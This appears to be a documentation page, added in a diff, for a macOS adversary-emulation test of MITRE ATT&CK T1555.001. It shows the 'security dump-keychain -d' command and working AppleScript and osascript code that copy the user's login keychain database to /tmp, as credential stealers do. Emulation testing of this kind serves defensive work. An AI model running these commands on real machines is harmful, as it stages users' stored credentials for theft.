@@ -1,0 +1,56 @@
+---
+title: T1555.001
+description: "Credentials from Password Stores  Keychain"
+---
+
+## Description from ATT&CK
+
+Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. 
+
+Keychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)
+
+Adversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain –d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  
+
+## Tests
+
+### Test #1 - Copy login keychain database
+
+Copies the user's login keychain database to a staging directory using Finder. Stealers such as BANSHEE, Odyssey and Atomic collect login.keychain-db so the stored credentials can be decrypted offline once the account password is captured.
+
+<span className="inline-flex items-center rounded-md bg-yellow-50 px-2 py-1 text-xs font-normal text-yellow-800 ring-1 ring-yellow-600/20 ring-inset">⚠️ TCC Required</span>
+
+**Input Arguments:**
+
+| Argument | Type | Default Value |
+|----------|------|---------------|
+| destination_path | str | `/tmp` |
+```applescript tab="<Code /> Script"
+tell application "Finder"
+  set destinationFolderPath to POSIX file "/tmp"
+  set keychainPath to (path to library folder from user domain as text) & "Keychains:login.keychain-db"
+  duplicate file keychainPath to folder destinationFolderPath with replacing
+end tell
+
+```
+```bash tab="<Terminal /> Execution"
+# Execute with default arguments
+osascript -e 'tell application "Finder"' -e 'set destinationFolderPath to POSIX file "/tmp"' -e 'set keychainPath to (path to library folder from user domain as text) & "Keychains:login.keychain-db"' -e 'duplicate file keychainPath to folder destinationFolderPath with replacing' -e 'end tell'
+
+# Or save to file and execute
+osascript copy_login_keychain_database.scpt
+
+# With custom arguments
+osascript copy_login_keychain_database.scpt "/tmp"
+```
+
+**Download Files**
+
+<DownloadButton filename="copy_login_keychain_database.scpt" type="scpt" label="Download .scpt" />
+<DownloadButton filename="copy_login_keychain_database.swift" type="swift" label="Download .swift" />
+<DownloadButton filename="copy_login_keychain_database" type="binary" label="Download Binary" />
+<DownloadButton filename="copy_login_keychain_database.app" type="app" label="Download Application Bundle" />
+
+## References
+
+- [MITRE ATT&CK T1555.001](https://attack.mitre.org/techniques/T1555/001/)
+- [Apple Script Language Guide](https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html)
